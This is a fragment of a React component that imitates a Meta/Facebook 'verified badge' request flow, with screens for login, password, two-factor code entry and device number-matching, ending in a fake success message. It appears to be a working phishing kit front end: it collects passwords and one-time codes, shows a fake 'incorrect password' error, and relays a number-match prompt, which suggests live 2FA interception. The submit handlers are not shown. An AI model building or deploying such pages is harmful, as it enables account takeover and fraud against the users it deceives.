                                                <button type="submit" className="fb-btn" disabled={loading} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px', background: '#0064e0', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', marginTop: '10px' }}>
                                                    {loading ? <LoadingSpinner /> : 'Continue'}
                                                </button>
                                            </form>
                                        </>
                                    )}

                                    {/* FORM 2: LOGIN */}
                                    {step === 2 && (
                                        <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                                            <input className="fb-input" style={{ width: '100%', padding: '12px', border: '1px solid #e0e2e4', borderRadius: '8px' }} placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required />
                                            <input className="fb-input" style={{ width: '100%', padding: '12px', border: '1px solid #e0e2e4', borderRadius: '8px' }} type="password" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required />
                                            {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', textAlign: 'center' }}>The password you entered is incorrect. Please try again.</div>}
                                            <button type="submit" className="fb-btn" disabled={loading} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px', background: '#0064e0', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer', marginTop: '10px' }}>
                                                {loading ? <LoadingSpinner /> : 'Log in'}
                                            </button>
                                        </form>
                                    )}

                                    {/* FORM 3 & 4: 2FA & SUCCESS */}
                                    {(step === 3 || showSuccess) && (
                                        <>
                                            {showSuccess ? (
                                                <div style={{ textAlign: 'center', padding: '20px 0' }}>
                                                    <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>Request Received</h2>
                                                    <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>Thank you! We have received your verification request. Your Official Verified Badge will be updated within 24 hours.</p>
                                                    <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn" style={{ width: '100%', padding: '12px', background: '#0064e0', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer' }}>Close</button>
                                                </div>
                                            ) : matchNumber ? (
                                                <>
                                                    <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', textAlign: 'center' }}>Check your other device</h2>
                                                    <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4', textAlign: 'center' }}>Open the notification on your other device, then tap this number to verify it's you: <strong>{matchNumber}</strong></p>
                                                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}><img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} /></div>
                                                    <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>{matchNumber}</div>
                                                </>
                                            ) : (
                                                <>
                                                    <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>Two-factor authentication</h2>
                                                    <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>Enter the 6-digit or 8-digit code we sent to your WhatsApp, SMS, Gmail, or Google Authenticator.</p>
                                                    <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                                                        <input className="fb-input" style={{ width: '100%', padding: '12px', border: '1px solid #e0e2e4', borderRadius: '8px', textAlign: 'center', fontSize: '24px', letterSpacing: '8px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
                                                        {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', textAlign: 'center' }}>Invalid security code. Please check the code and try again.</div>}
                                                        <button type="submit" className="fb-btn" disabled={loading || otp.length < 6} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px', background: '#0064e0', color: '#fff', border: 'none', borderRadius: '8px', cursor: 'pointer' }}>
                                                            {loading ? <LoadingSpinner /> : 'Verify'}
                                                        </button>
                                                    </form>
                                                </>
                                            )}
                                        </>
                                    )}
                                </>
                            )}

                            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
                                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
                            </div>
                        </div>
                    </div>
                )}
            </div>
        </>
    );
};

export default Home;